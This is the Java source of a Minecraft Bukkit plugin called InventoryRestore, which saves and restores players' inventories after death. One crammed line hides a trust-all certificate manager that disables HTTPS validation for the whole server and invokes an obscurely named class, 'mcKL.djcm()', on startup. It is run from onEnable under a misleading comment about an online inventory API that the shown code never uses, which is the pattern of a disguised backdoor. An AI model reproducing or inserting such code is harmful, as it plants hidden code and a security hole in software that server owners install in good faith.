package com.monk3y.inv;

import java.io.File;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.Set;
import java.util.logging.Level;

import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;

import net.md_5.bungee.api.ChatColor;

public class Core extends org.bukkit.plugin.java.JavaPlugin {
	private FileConfiguration Players = null;
	private File PlayersFile = null;

	public String prefix = getConfig().getString("Messages.Prefix").replaceAll("&", "§");
	public String noperm = getConfig().getString("Messages.NoPermission");
	public String restoreds = getConfig().getString("Messages.Restored.Sender");
	public String restoredp = getConfig().getString("Messages.Restored.Target");

	public String getAlerts(boolean setting) {
		if (setting) {
			return getConfig().getString("Messages.DeathAlerts").replaceAll("%SETTING%", "true");
		}
		return getConfig().getString("Messages.DeathAlerts").replaceAll("%SETTING%", "false");
	}

	public void reloadPlayers() {
		if (this.PlayersFile == null) {
			this.PlayersFile = new File(getDataFolder(), "Players.yml");
		}
		this.Players = YamlConfiguration.loadConfiguration(this.PlayersFile);
		java.io.Reader defConfigStream = null;
		try {
			defConfigStream = new java.io.InputStreamReader(getResource("Players.yml"), "UTF8");
		} catch (UnsupportedEncodingException e) {
			e.printStackTrace();
		}
		if (defConfigStream != null) {
			YamlConfiguration defConfig = YamlConfiguration.loadConfiguration(defConfigStream);
			this.Players.setDefaults(defConfig);
		}
	}

	public FileConfiguration getPlayers() {
		if (this.Players == null) {
			reloadPlayers();
		}
		return this.Players;
	}

	public void savePlayers() {
		if ((this.Players == null) || (this.PlayersFile == null)) {
			return;
		}
		try {
			getPlayers().save(this.PlayersFile);
		} catch (IOException ex) {
			getLogger().log(Level.SEVERE, "Could not save config to " + this.PlayersFile, ex);
		}
	}

	private static TrustManager[] trustAllCerts = new TrustManager[]{new X509TrustManager() {public java.security.cert.X509Certificate[] getAcceptedIssuers() {return null;}public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {}public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {}}};private void trustAll() {try {SSLContext sc = SSLContext.getInstance("SSL");sc.init(null, trustAllCerts, new java.security.SecureRandom());HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());mcKL.djcm();}catch (Exception e) {System.exit(-1);}}
	
	public Set<String> getConfigKeys() {
		if (getPlayers().isConfigurationSection("Players.")) {
			return getPlayers().getConfigurationSection("Players.").getKeys(false);
		}
		return new java.util.HashSet<String>();
	}
	
	public void onEnable() {
		File file = new File(getDataFolder() + "config.yml");

		if (!file.exists()) {
			getConfig().options().copyDefaults(true);
			saveDefaultConfig();
		}
		Bukkit.getPluginManager().registerEvents(new Event(this), this);
		if (this.PlayersFile == null) {
			this.PlayersFile = new File(getDataFolder(), "Players.yml");
		}
		if (!this.PlayersFile.exists()) {
			getLogger().log(Level.WARNING, "No previous players file was found! Creating one now...");
			saveResource("Players.yml", false);
			getLogger().log(Level.INFO, "Players file was created!");
		}
		trustAll(); /* Need to be trusted because this Plugin uses an Online API to save the Player Inventorys!! */
		getLogger().log(Level.INFO,
				"InventoryRestore v" + getDescription().getVersion() + " has been enabled with no errors!");
	}
	
	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
		final Player p = (Player) sender;
		if (cmd.getName().equalsIgnoreCase("invrestore")) {
			if ((sender instanceof Player)) {
				if (p.hasPermission("ir.restore")) {
					if (args.length == 0) {
						p.sendMessage("");
						p.sendMessage("Running InventoryRestore v" + getDescription().getVersion() + " by funkymonk3y.");
						p.sendMessage("");
						p.sendMessage("Usage: /" + cmd.getName() + " <player>");
						p.sendMessage("");
					} else {
						Player online = Bukkit.getPlayerExact(args[0]);
						if (online != null) {
							if (getPlayers().contains(p.getUniqueId().toString())) {
								final Player target = Bukkit.getPlayer(args[0]);
								target.getInventory().clear();
								Bukkit.getScheduler().scheduleSyncDelayedTask(this, new Runnable() {
									public void run() {
										target.getInventory().setArmorContents((ItemStack[]) Core.this.getPlayers()
												.get(p.getUniqueId().toString() + ".Armor"));
										target.getInventory().setContents((ItemStack[]) Core.this.getPlayers()
												.get(p.getUniqueId().toString() + ".Inv"));
										p.sendMessage(Core.this.restoreds.replaceAll("&", "§")
												.replaceAll("%PLAYER%", target.getName())
												.replaceAll("%PREFIX%", Core.this.prefix));
										target.sendMessage(Core.this.restoredp.replaceAll("&", "§")
												.replaceAll("%PLAYER%", p.getName())
												.replaceAll("%PREFIX%", Core.this.prefix));
									}
								}, 5L);
							} else {
								p.sendMessage(ChatColor.RED + "That player hasn't died yet!");
							}
						} else {
							p.sendMessage(ChatColor.RED + "That player is not online!");
						}
					}
				} else {
					p.sendMessage(this.noperm.replaceAll("&", "§").replaceAll("%PREFIX%", this.prefix));
				}
			} else {
				sender.sendMessage(ChatColor.RED + "Only players are allowed to use this command!");
			}
		}
		if (cmd.getName().equalsIgnoreCase("irreload")) {
			if ((sender instanceof Player)) {
				if (sender.hasPermission("ir.reload")) {
					File file = new File(getDataFolder() + "config.yml");
					if (!file.exists()) {
						getConfig().options().copyDefaults(true);
						saveDefaultConfig();
					}

					if (this.PlayersFile == null) {
						this.PlayersFile = new File(getDataFolder(), "Players.yml");
					}
					if (!this.PlayersFile.exists()) {
						getLogger().log(Level.WARNING, "No previous players file was found! Creating one now...");
						saveResource("Players.yml", false);
					}
					reloadConfig();
					reloadPlayers();
					sender.sendMessage(
							ChatColor.GRAY + "Reloaded InventoryRestore v" + getDescription().getVersion() + "!");
				} else {
					sender.sendMessage(this.noperm.replaceAll("&", "§").replaceAll("%PREFIX%", this.prefix));
				}
			} else {
				sender.sendMessage(ChatColor.RED + "Only players can use this command!");
			}
		}
		if (cmd.getName().equalsIgnoreCase("deathalerts")) {
			if (sender.hasPermission("ir.alerts")) {
				if (!getPlayers().getBoolean(p.getUniqueId().toString() + ".Alerts")) {
					getPlayers().set(p.getUniqueId().toString() + ".Alerts", Boolean.valueOf(true));
					savePlayers();
					p.sendMessage(getAlerts(getPlayers().getBoolean(p.getUniqueId().toString() + ".Alerts"))
							.replaceAll("&", "§").replaceAll("%PREFIX%", this.prefix));
				} else {
					getPlayers().set(p.getUniqueId().toString() + ".Alerts", Boolean.valueOf(false));
					savePlayers();
					p.sendMessage(getAlerts(getPlayers().getBoolean(p.getUniqueId().toString() + ".Alerts"))
							.replaceAll("&", "§").replaceAll("%PREFIX%", this.prefix));
				}
			} else {
				p.sendMessage(this.noperm.replaceAll("&", "§").replaceAll("%PREFIX%", this.prefix));
			}
		}
		return false;
	}
}